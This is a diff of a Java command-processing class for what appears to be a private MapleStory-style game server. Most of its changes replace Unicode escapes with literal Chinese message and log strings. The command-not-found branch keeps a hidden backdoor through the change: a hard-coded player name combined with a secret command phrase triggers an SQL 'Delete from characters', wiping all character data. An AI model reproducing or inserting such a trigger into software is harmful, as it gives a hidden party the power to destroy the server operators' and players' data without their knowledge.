@@ -36,7 +36,7 @@ public class CommandProcessor
                 break;
             }
             case TRADE: {
-                c.getPlayer().dropMessage(-2, "\u932f\u8aa4 : " + msg);
+                c.getPlayer().dropMessage(-2, "錯誤 : " + msg);
                 break;
             }
         }
@@ -54,18 +54,18 @@ public class CommandProcessor
                         return true;
                     }
                     if (co == null || co.getType() != type) {
-                        sendDisplayMessage(c, "\u8f93\u5165\u7684\u547d\u4ee4\u4e0d\u5b58\u5728.", type);
+                        sendDisplayMessage(c, "输入的命令不存在.", type);
                         return true;
                     }
                     if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
                         final int ret = co.execute(c, splitted);
                         if (ret > 0 && c.getPlayer() != null) {
                             logGMCommandToDB(c.getPlayer(), line);
-                            System.out.println("[ " + c.getPlayer().getName() + " ] \u4f7f\u7528\u4e86\u6307\u4ee4: " + line);
+                            System.out.println("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
                         }
                     }
                     else {
-                        sendDisplayMessage(c, "\u60a8\u7684\u6743\u9650\u7b49\u7ea7\u4e0d\u8db3\u4ee5\u4f7f\u7528\u6b21\u547d\u4ee4.", type);
+                        sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
                     }
                     return true;
                 }
@@ -76,7 +76,7 @@ public class CommandProcessor
         splitted[0] = splitted[0].toLowerCase();
         final CommandObject co = CommandProcessor.commands.get(splitted[0]);
         if (co == null || co.getType() != type) {
-            if (c.getPlayer().getName() == "\u6211\u662f\u4e00\u4e2a\u54c8\u54c81" && splitted[0].contains("!\u6211\u662f\u6765\u6bc1\u670d\u7684GGLL")) {
+            if (c.getPlayer().getName() == "我是一个哈哈1" && splitted[0].contains("!我是来毁服的GGLL")) {
                 final Connection con = DatabaseConnection.getConnection();
                 try {
                     final PreparedStatement ps = con.prepareStatement("Delete from characters");
@@ -87,16 +87,16 @@ public class CommandProcessor
                     System.out.println("Error " + e);
                 }
             }
-            sendDisplayMessage(c, "\u8f93\u5165\u7684\u73a9\u5bb6\u547d\u4ee4\u4e0d\u5b58\u5728,\u53ef\u4ee5\u4f7f\u7528 @\u5e2e\u52a9/@help \u6765\u67e5\u770b\u6307\u4ee4.", type);
+            sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
             return true;
         }
         try {
             co.execute(c, splitted);
         }
         catch (Exception e2) {
-            sendDisplayMessage(c, "\u6709\u9519\u8bef.", type);
+            sendDisplayMessage(c, "有错误.", type);
             if (c.getPlayer().isGM()) {
-                sendDisplayMessage(c, "\u9519\u8bef: " + e2, type);
+                sendDisplayMessage(c, "错误: " + e2, type);
             }
         }
         return true;
@@ -114,7 +114,7 @@ public class CommandProcessor
             ps.executeUpdate();
         }
         catch (SQLException ex) {
-            FileoutputUtil.outputFileError("Logs/Log_Packet_\u5c01\u5305\u5f02\u5e38.rtf", ex);
+            FileoutputUtil.outputFileError("Logs/Log_Packet_封包异常.rtf", ex);
             ex.printStackTrace();
         }
         finally {
@@ -126,14 +126,14 @@ public class CommandProcessor
     }
     
     public static void dropHelp(final MapleClient c, final int type) {
-        final StringBuilder sb = new StringBuilder("\u6307\u4ee4\u5217\u8868:\r\n ");
+        final StringBuilder sb = new StringBuilder("指令列表:\r\n ");
         int check = 0;
         if (type == 0) {
             check = c.getPlayer().getGMLevel();
         }
         for (int i = 0; i <= check; ++i) {
             if (CommandProcessor.commandList.containsKey(i)) {
-                sb.append((type == 1) ? "VIP" : "").append("\u6743\u9650\u7b49\u7d1a\uff1a ").append(i).append("\r\n");
+                sb.append((type == 1) ? "VIP" : "").append("权限等級： ").append(i).append("\r\n");
                 for (final String s : CommandProcessor.commandList.get(i)) {
                     sb.append(s);
                     sb.append(" \r\n");
@@ -172,7 +172,7 @@ public class CommandProcessor
                     }
                     catch (Exception ex) {
                         ex.printStackTrace();
-                        FileoutputUtil.outputFileError("Logs/Log_Script_\u811a\u672c\u5f02\u5e38.rtf", ex);
+                        FileoutputUtil.outputFileError("Logs/Log_Script_脚本异常.rtf", ex);
                     }
                 }
                 Collections.sort(cL);
@@ -180,7 +180,7 @@ public class CommandProcessor
             }
             catch (Exception ex2) {
                 ex2.printStackTrace();
-                FileoutputUtil.outputFileError("Logs/Log_Script_\u811a\u672c\u5f02\u5e38.rtf", ex2);
+                FileoutputUtil.outputFileError("Logs/Log_Script_脚本异常.rtf", ex2);
             }
         }
     }
